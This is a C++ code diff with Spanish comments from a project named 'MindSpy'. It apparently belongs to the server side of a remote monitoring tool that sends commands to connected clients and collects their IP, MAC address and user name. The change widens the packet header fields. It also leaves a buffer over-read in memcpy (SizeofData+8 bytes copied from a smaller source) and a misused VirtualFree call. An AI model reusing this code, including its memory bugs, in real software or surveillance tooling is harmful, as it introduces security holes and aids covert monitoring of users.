@@ -67,14 +67,14 @@ namespace MindSpy
 		return IP_NO_REGISTRADA;
 	}
 
-	bool Servidor::EnviarComando(char* IP, USHORT SizeofData, USHORT comando, BYTE* Data)
+	bool Servidor::EnviarComando(char* IP, UINT32 SizeofData, UINT32 comando, BYTE* Data)
 	{
 		/*
 		La estructura de los paquetes a enviar, es siempre la misma, independientemente de
 		los datos a enviar. Sin embargo, el tamaño de dichos datos puede variar.
 
-		Los primeros dos bytes del paquete, corresponden al tamaño del paquete. Los segundos
-		dos bytes corresponden al comando asociado a la data y del quinto byte en adelante,
+		Los primeros cuatro bytes del paquete, corresponden al tamaño del paquete. Los segundos
+		cuatro bytes corresponden al comando asociado a la data y del octavo byte en adelante,
 		se ubica la data a enviar.
 		*/
 		// Obtener el socket asociado a la IP
@@ -83,37 +83,52 @@ namespace MindSpy
 			return false;
 
 		// Se reserva memoria para el tamaño de la data + el opcode (comando) + data
-		BYTE *DataToSend = (BYTE*)VirtualAlloc(NULL, SizeofData + 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		// Se mueven a los primeros 2 bytes (unsigned short), el tamaño del paquete
-		*(USHORT*)DataToSend = SizeofData + 4;
-		// Se mueve el comando a los siguientes 2 bytes
-		*(USHORT*)(DataToSend + 2) = comando;
+		BYTE *DataToSend = (BYTE*)VirtualAlloc(NULL, SizeofData + 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		// Se mueven a los primeros 4 bytes (unsigned short), el tamaño del paquete
+		*(UINT32*)DataToSend = SizeofData;
+		// Se mueve el comando a los siguientes 4 bytes
+		*(UINT32*)(DataToSend + 4) = comando;
 		// Se copia la data pasada por parámetro a la memoria reservada
 		if (Data) 
-			memcpy(DataToSend + 4, Data, SizeofData + 4);
+			memcpy(DataToSend + 8, Data, SizeofData + 8);
 		// Se envian los datos
-		bool r = send(Conexiones[res].c_socket, (const char*)DataToSend, SizeofData + 4, 0) != SOCKET_ERROR;
+		bool r = send(Conexiones[res].c_socket, (const char*)DataToSend, SizeofData + 8, 0) != SOCKET_ERROR;
 		// Se libera la memoria
 		VirtualFree(DataToSend, SizeofData, MEM_RELEASE);
 		return r;
 	}
 
 	void Servidor::HiloConexion() {
+		// Obtener el ID actual
 		int MyID = Conexiones.size() - 1;
+		// Asignar el ID al registro
 		Conexiones[MyID].Activa = true;
 		char szBuff[512];
+		// Mientras la conexión esté activa...
 		while (Conexiones[MyID].Activa) {
+			// variable para guardar la cantidad de bytes disponibles en el stream
 			DWORD bDisponibles;
+			// Validar si la conexión sigue activa
+			int resp = recv(Conexiones[MyID].c_socket, szBuff, 1, MSG_PEEK);
+			// Si no lo está, nos vamos
+			if (resp == SOCKET_ERROR)
+				break;
+
+			// Verificamos si hay bytes por leer
 			ioctlsocket(Conexiones[MyID].c_socket, FIONREAD, &bDisponibles);
-			if (!bDisponibles) 
+			// si no los hay, ralentizamos y reiniciamos el ciclo
+			if (!bDisponibles) {
+				Sleep(50);
 				continue;
-			int resp = recv(Conexiones[MyID].c_socket, szBuff, sizeof(szBuff), 0);
+			}
+			// Si los hay, los leemos
+			resp = recv(Conexiones[MyID].c_socket, szBuff, sizeof(szBuff), 0);
 			if (resp == 0)
 				continue;
 			else if (resp < 0)
 				break;
 
-			USHORT comando = *(USHORT*)&szBuff[2];
+			UINT32 comando = *(UINT32*)(szBuff+4);
 
 			switch (comando)
 			{
@@ -126,7 +141,7 @@ namespace MindSpy
 				break;
 
 			case CLNT_CMDS::SYSINFO:
-				Conexiones[MyID].SistemaCliente = *(stSystemInfoResponse*)&szBuff[4];
+				Conexiones[MyID].SistemaCliente = *(stSystemInfoResponse*)(szBuff + 8);
 				wcout << L"Informacion de cliente recibida." << endl;
 				wcout << L"IP: " << Conexiones[MyID].IP << endl;
 				wcout << L"MAC: " << Conexiones[MyID].SistemaCliente.MAC << endl;
@@ -138,10 +153,9 @@ namespace MindSpy
 				wcout << L"Nombre de usuario: " << Conexiones[MyID].SistemaCliente.NombreUsuario << endl;
 				break;
 			}
-
-			Sleep(50);
 		}
 		wcout << L"Cerrando conexion con " << Conexiones[MyID].IP << L" (" << Conexiones[MyID].ID << L")..." << endl;
+		Conexiones[MyID].Activa = false;
 		closesocket(Conexiones[MyID].c_socket);
 	}
 
